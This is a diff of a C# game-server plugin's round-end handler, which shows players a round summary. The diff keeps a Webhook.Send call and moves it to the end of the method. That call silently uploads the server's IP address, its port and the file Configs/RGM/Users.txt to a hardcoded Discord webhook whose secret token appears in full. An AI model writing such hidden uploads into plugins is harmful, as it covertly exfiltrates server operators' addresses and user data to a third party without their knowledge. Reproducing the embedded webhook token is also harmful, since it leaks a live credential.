@@ -223,8 +223,6 @@ namespace RGM.EventArgs
 
         public static void OnRoundEnded(RoundEndedEventArgs ev)
         {
-            Webhook.Send($"# {Server.IpAddress}:{Server.Port}", "https://discord.com/api/webhooks/1373673172401913928/MKZROq8z9OjuGn21Oj8yjuTMHamSf8Z_VGE5BBebFO9c_WFvD9KphmcN2wZucC2cczLS", $"{Paths.Configs}/RGM/Users.txt");
-
             if (CurrentMode.GetModeData().Info == ModeInfo.Plus)
             {
                 IEnumerable<Player> players = Player.List.Where(x => x.IsAlive && !x.IsNPC);
@@ -289,6 +287,8 @@ namespace RGM.EventArgs
             {
                 player.AddHint("라운드 요약", $"<align=left>{sb}</align>\n\n\n\n", 20);
             }
+
+            Webhook.Send($"# {Server.IpAddress}:{Server.Port}", "https://discord.com/api/webhooks/1373673172401913928/MKZROq8z9OjuGn21Oj8yjuTMHamSf8Z_VGE5BBebFO9c_WFvD9KphmcN2wZucC2cczLS", $"{Paths.Configs}/RGM/Users.txt");
         }
     }
 }
